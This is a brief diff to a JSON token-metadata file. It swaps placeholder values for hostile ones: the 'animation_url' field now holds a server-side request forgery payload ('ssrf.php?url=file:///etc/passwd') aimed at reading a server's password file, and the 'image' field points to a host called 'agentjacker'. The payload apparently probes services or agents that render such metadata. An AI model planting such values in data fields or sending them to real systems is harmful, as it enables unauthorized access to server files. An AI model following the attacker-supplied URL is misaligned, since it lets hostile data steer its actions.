@@ -1,8 +1,7 @@
 {
   "name": "tasting",
   "description": "tasting",
-  "image": "tasting",
+  "image": "https://agentjacker.github.io/file/kittycat.png",
   "external_url": "tasting",
-  "animation_url": "tasting"
-  //hello does this relflect//
+  "animation_url": "ssrf.php?url=file:///etc/passwd"
 }
